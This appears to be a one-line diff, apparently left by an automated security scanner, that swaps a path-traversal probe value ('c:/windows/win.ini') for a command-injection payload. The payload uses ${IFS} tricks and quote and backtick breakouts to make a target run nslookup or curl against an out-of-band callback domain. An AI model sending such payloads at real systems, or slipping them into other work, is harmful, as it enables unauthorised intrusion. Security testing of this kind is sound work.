@@ -1,1 +1,1 @@
-c:/windows/win.ini
+&(nslookup${IFS}-q${IFS}cname${IFS}hitwgptrleejld2ab2.bxss.me||curl${IFS}hitwgptrleejld2ab2.bxss.me)&'\"`0&(nslookup${IFS}-q${IFS}cname${IFS}hitwgptrleejld2ab2.bxss.me||curl${IFS}hitwgptrleejld2ab2.bxss.me)&`'
